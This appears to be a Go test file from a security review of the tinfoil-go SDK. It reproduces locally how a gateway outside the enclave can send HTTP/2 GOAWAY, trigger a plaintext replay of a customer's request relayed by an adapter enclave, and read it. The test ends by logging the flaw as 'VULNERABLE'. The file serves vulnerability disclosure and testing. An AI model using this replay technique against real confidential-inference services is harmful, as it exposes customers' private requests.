package tinfoil

// Server-to-server variant (local only): an enclave service shaped like
// confidential-openai-adapter (proxy.go forward/newProxy) receives a customer's
// OpenAI request, sets r.GetBody to the plaintext, and reverse-proxies it via
// httputil.ReverseProxy through the tinfoil-go Gateway sealing transport to the
// Tinfoil inference gateway, which sits OUTSIDE any enclave and terminates TLS.
// The gateway answers the first stream with GOAWAY(NO_ERROR, last=0), reads the
// plaintext replay, then forwards the genuine ciphertext to the replica
// enclave and relays its encrypted answer.

import (
	"bytes"
	"io"
	"net/http"
	"net/http/httptest"
	"net/http/httputil"
	"net/url"
	"strings"
	"testing"

	"github.com/tinfoilsh/tinfoil-go/document"
	"github.com/tinfoilsh/tinfoil-go/enclave"
	"github.com/tinfoilsh/tinfoil-go/verify"
)

func TestVariantSDK_AdapterReverseProxyThroughGateway(t *testing.T) {
	sdkSetup(t)
	var saw string
	id, replicaSrv := sdkEnclave(t, &saw)
	gw, gatewayURL := startGoaway(t, replicaSrv.URL, func(n int, c *vCap) bool { return n == 0 })

	verifier := transportVerifierFunc(func(build func(*verify.Verification) (http.RoundTripper, error), _ func(error) bool) (http.RoundTripper, error) {
		return build(&verify.Verification{CryptoMaterial: []document.CryptoMaterialItem{{
			ID: document.CryptoMaterialIDHPKE, Format: document.KeyX25519HPKEV1Format, Data: id.MarshalPublicKeyHex(),
		}}})
	})
	// Mirrors NewGateway's sealing transport with attestation stubbed.
	seal := &sealTransport{
		catalog: func() Catalog {
			return Catalog{"m": {Repo: "tinfoilsh/confidential-model-x", Hosts: []string{"replica.example"}}}
		},
		policy: gatewayPolicy{pins: map[string]*enclave.Handle{}},
		secret: "",
		build: func(r replica) (http.RoundTripper, error) {
			httpClient, err := ehbpHTTPClient(verifier, r.host, gatewayURL)
			if err != nil {
				return nil, err
			}
			return &verifiedReplicaTransport{
				recoveryTransport: &recoveryTransport{transport: httpClient.Transport},
				verification:      func() *verify.Verification { return nil },
			}, nil
		},
	}
	hc, err := boundHTTPClient(&http.Client{Transport: seal}, "", gatewayURL, "")
	if err != nil {
		t.Fatal(err)
	}
	gwURL, _ := url.Parse(gatewayURL)

	// confidential-openai-adapter/proxy.go newProxy + forward (abridged).
	proxy := &httputil.ReverseProxy{
		Rewrite: func(pr *httputil.ProxyRequest) {
			pr.Out.URL.Scheme, pr.Out.URL.Host, pr.Out.Host = gwURL.Scheme, gwURL.Host, gwURL.Host
		},
		Transport:     hc.Transport,
		FlushInterval: -1,
		ErrorHandler: func(w http.ResponseWriter, r *http.Request, err error) {
			t.Logf("adapter upstream error: %v", err)
			w.WriteHeader(http.StatusBadGateway)
		},
	}
	adapter := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		raw, _ := io.ReadAll(r.Body)
		raw = bytes.Replace(raw, []byte(`{`), []byte(`{"user_cache_secret":"hmac-of-customer-api-key",`), 1)
		r.Header.Set("Content-Type", "application/json")
		r.Body = io.NopCloser(bytes.NewReader(raw))
		r.GetBody = func() (io.ReadCloser, error) { return io.NopCloser(bytes.NewReader(raw)), nil }
		r.ContentLength = int64(len(raw))
		proxy.ServeHTTP(w, r)
	}))
	defer adapter.Close()

	// The customer calls the adapter enclave (its TLS is terminated by the shim
	// inside the enclave; plain HTTP here).
	custReq, _ := http.NewRequest(http.MethodPost, adapter.URL+"/v1/chat/completions",
		strings.NewReader(`{"model":"m","messages":[{"role":"user","content":"CUSTOMER-SECRET: Q3 layoffs list attached"}]}`))
	custReq.Header.Set("Authorization", "Bearer tk_customer")
	resp, err := http.DefaultClient.Do(custReq)
	if err != nil {
		t.Fatal(err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	t.Logf("customer got status=%d body=%q", resp.StatusCode, body)
	t.Logf("replica enclave decrypted: %q", saw)
	if !dump(t, gw, "Q3 layoffs") {
		t.Fatal("gateway did not see plaintext")
	}
	if resp.StatusCode != 200 {
		t.Fatalf("expected the customer call to succeed")
	}
	t.Log("VULNERABLE (server-to-server): the out-of-enclave gateway read the customer's plaintext request relayed by the adapter enclave; the call succeeded")
}
